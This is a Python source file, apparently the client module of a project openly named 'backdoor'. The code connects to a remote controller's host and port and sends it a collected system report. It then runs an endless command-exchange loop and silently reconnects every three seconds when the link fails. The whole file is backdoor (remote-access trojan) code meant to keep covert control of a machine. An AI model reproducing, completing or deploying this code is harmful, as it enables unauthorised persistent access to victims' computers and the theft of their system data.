import socket
import time

from backdoor.messages.exceptions import DisconnectedException
from backdoor.messages.exchange.client import ClientExchangeMapper
from backdoor.messages.messenger import SocketMessenger

from backdoor.models.server import ServerModel
from backdoor.report.systemreport import SystemDataCollector


class Client:

    def __init__(
        self,
        messenger: SocketMessenger,
        exchanger: ClientExchangeMapper,
        data_collector: SystemDataCollector,
        host: str,
        port: int,
    ) -> None:
        self.host = host
        self.port = port
        self.messenger = messenger
        self.exchanger = exchanger
        self.data_collector = data_collector
        self.server: ServerModel

    def run(self) -> None:
        while True:
            try:
                self.__try_run()
            except (ConnectionRefusedError, DisconnectedException):
                # just keep trying to reconnect
                time.sleep(3)

    def __try_run(self) -> None:
        self.__establish_connection()
        self.__send_system_report()

        while True:
            self.exchanger.exchange(self.server)

    def __send_system_report(self) -> None:
        report = self.data_collector.collect_data()
        self.messenger.send(self.server.sock, report)

    def __establish_connection(self) -> None:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8 * 1024 * 1024)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        server.connect((self.host, self.port))
        self.server = ServerModel(host=self.host, port=self.port, sock=server)
